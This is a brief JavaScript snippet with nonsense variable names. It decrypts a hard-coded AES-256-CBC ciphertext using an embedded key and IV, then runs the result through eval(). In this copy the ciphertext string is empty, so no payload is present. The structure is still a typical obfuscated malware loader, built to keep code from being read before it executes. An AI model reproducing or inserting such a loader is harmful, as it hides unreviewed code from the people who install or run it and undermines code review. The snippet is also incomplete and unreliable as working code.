const ito = require('crypto');
const itinho = Buffer.from('57beb9e9278cb9f47d02a45f38a94cd50c5b9d77a4041ea7c6e37afef846f906', 'hex');
const octua = Buffer.from('b95e1eac507a1b6c2179328b92ae784c', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
